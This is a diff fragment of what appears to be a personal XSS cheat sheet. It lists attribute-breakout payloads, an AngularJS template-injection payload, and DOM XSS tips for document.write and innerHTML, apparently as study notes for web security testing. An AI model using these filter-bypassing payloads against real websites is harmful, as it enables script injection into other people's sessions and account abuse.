@@ -13,7 +13,14 @@ but filters http/https:
 123" onmouseover="alert(document.domain);                     when < and > are encoded as &lt and &gt use this payload
 a onmouseover=alert(document.domain);                         when the server side escapes quotes 
 use a acnein to check whether additional attributes can be added.
-
+ Angular JS is used and ng-app directive is mentioned then use --- {{constructor.constructor('alert(1)')()}}
+ 
+ DOM XSS:
+ document.write --- use any payload depending upon filters
+ innerHTML  ---- script and svg tags wont work so use <a> or <img>
+ Properly understand regex
+ 
+ 
 
 XSS to CSRF --- 
 <script>
